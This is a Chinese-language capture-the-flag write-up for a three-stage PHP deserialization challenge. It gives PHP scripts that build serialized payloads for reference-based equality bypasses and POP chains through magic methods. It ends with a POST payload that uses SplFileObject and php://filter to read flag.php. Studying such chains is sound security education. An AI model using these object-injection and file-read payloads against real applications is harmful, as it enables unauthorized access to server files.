# ezSerialize

> 分类：Web

## 题目描述
PHP 反序列化题，分三段。第一段利用引用绕过 `token === password` 强相等；第二段构造 POP 链 `E::__unserialize -> D::__toString -> B::__get -> A::invoke -> C::__call`；第三段构造 `XYCTFNO3::__wakeup -> XYCTFNO2::XYCTF -> XYCTFNO3::XY`，最终用原生类 `SplFileObject` 配合 php 伪协议读 flag.php。

## 考察知识点
- PHP 引用传递绕过强相等
- POP 链（魔术方法链）
- PHP 原生类 SplFileObject 读文件
- php://filter 伪协议

## 解法
第一段：引用绕过
```php
<?php
class Flag { public $token; public $password; }
$a=new Flag();
$a->password=&$a->token;
echo serialize($a);
```
访问 `./fpclosefpclosefpcloseffflllaaaggg.php` 进入第二段。

第二段链子：`E#__unserialize -> D#__toString -> B#__get -> A#invoke -> C#__call`
```php
<?php
class A { public $mack; }
class B { public $luo; }
class C { public $wang1; }
class D { public $lao; public $chen; }
class E { public $name; public $num; }
$a=new E();
$b=new D();
$c=new B();
$d=new A();
$e=new C();
$d->mack=$e;
$c->luo=$d;
$b->lao=$c;
$a->name=$b;
echo serialize($a);
```
（注：E 的 `__unserialize` 中 `echo $data['num']` 触发 D 的 `__toString`，D 访问 `$this->lao->chen` 触发 B 的 `__get`，B 的 `$function()` 触发 A 的 `__invoke`，A 调用不存在方法触发 C 的 `__call`。）

访问 `./saber_master_saber_master.php` 进入第三段。

第三段链子：`XYCTFNO3#__wakeup -> XYCTFNO2.XYCTF() -> XYCTFNO3.XY()`
```php
<?php
class XYCTFNO1 { public $Liu; public $T1ng; private $upsw1ng; }
class XYCTFNO2 { public $crypto0; public $adwa; }
class XYCTFNO3 { public $KickyMu; public $fpclose; public $N1ght; }
$a=new XYCTFNO3();
$b=new XYCTFNO2();
$c=new XYCTFNO1();
$c->crypto0='dev1l';
$c->T1ng='yuroandCMD258';
$b->adwa=$c;
$a->KickyMu=$b;
$a->N1ght='oSthing';
echo serialize($a);
```
（注意：`XYCTFNO1` 中的属性 `crypto0`/`T1ng` 需自行构造，因为 `XYCTFNO2::XYCTF` 检查 `$this->adwa->crypto0` 和 `$this->adwa->T1ng`。）

最后 POST 传参，用 `SplFileObject` 配合 php 伪协议读文件：
```
X=SplFileObject&Y=php://filter/convert.base64-encode/resource=flag.php
```
对返回的 base64 解码得 flag。

## 参考答案
（未给出，见截图）

## 来源
- 作者：Z3r4y（uuzeray） | https://blog.csdn.net/uuzeray/article/details/138274291
- 作者：HvAng | https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html
- 作者：J1rrY | https://j1rry-learn.github.io/posts/2024-xyctf-webmisc-wp/
